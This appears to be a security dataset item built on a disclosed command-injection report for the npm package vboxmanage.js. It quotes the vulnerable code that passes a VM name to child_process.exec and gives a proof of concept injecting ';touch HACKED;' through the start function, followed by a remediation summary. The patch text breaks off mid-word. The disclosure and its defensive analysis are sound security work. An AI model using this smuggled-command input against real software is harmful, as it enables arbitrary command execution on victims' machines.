# CMDI — h1

- source: h1
- class: cmdi
- cwe: CWE-77
- severity: critical
- program: nodejs-ecosystem
- quality_score: 13

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** [vboxmanage.js] Command Injection via insecure command concatenation
**Affected Asset:** Other module

**Vulnerability Description:**
I would like to report a `Command Injection` issue in the `vboxmanage.js` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `vboxmanage.js`
**version:** `1.0.6`
**npm page:** `https://www.npmjs.com/package/vboxmanage.js`

## Module Description

A wrapper for VirtualBox CLI with Promises,

## Module Stats

[2] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

I tested the `start` function.
Here's the code which causes the issue:

```javascript
// https://github.com/danielgindi/node-vboxmanage/blob/master/index.js#L76
...
var
    child_process = require('child_process'),
...
VBoxManage.manage = function (command, options) {

    command = command || [];
    if (!(command instanceof Array)) {
        command = [command];
    }

    options = options || {};

    for (var i = 0; i < command.length; i++) {
        command[i] = escapeArg(command[i]);
    }

    Object.keys(options).forEach(function (option) {

        command.push('--' + option);
        var value = options[option];

        if (value !== true) {
            command.push(escapeArg(value));
        }

    });

    if (VBoxManage.debug) {
        console.warn("$ VBoxManage " + command.join(" "));
    }

    return new Promise(function (resolve, reject) {

        child_process.exec(vBoxManageBinary + ' ' + command.join(' '), {}, function (err, stdout, stderr) {  // <-- injection

            if (err) {
                err.stderr = stderr;
                return reject(err);
            }

            return resolve({ stdout: stdout, stderr: stderr });

        });

    });
};
...
VBoxManage.start = function (vmname, gui, options) {
    options = options || {};
    options['type'] = gui ? 'gui' : 'headless';
    return this.manage(['-nologo', 'startvm', vmname], options); // <-- user input
};
...
```
The `vmname` parameter is used to build the command that is passed to the `child_process.exec` function without any check.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `vboxmanage.js` module:
    -  `npm i vboxmanage.js`
- create the following PoC JavaScript file (`poc.js`):

```javascript
var VBox = require('vboxmanage.js');
VBox.start(';touch HACKED;').then(function () {}).catch(function (err) {});
```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F812305}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFil

## Analysis / Response

**Vulnerability Class:** cmdi
**CWE:** CWE-77
**Weakness:** Command Injection - Generic
**Severity:** critical
**Endpoint Pattern:** https://www.npmjs.com/package/vboxmanage.js

**Impact Assessment:**
Command Injection on `vboxmanage.js` module via insecure command concatenation.

**Remediation:**
Avoid passing user input to system commands. Use language-native APIs instead of shell execution. If unavoidable, use strict allowlists for permitted values.
